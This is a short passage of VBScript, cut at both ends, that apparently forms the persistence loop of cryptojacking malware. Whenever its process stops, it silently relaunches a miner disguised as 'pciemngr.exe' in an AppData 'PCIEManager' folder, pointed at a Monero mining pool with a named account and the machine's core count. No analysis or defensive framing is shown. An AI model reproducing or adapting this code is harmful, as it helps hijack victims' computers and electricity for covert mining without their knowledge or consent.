...
If Not Running Then
WScript.Sleep 500
WshShell.Run WshShell.ExpandEnvironmentStrings("%APPDATA%")&"\PCIEManager\pciemngr.exe -o stratum+tcp://xmr.pool.minergate.com:45560 -u jkd2@yandex.ru -p x -t "&cores, 0
End if
Loop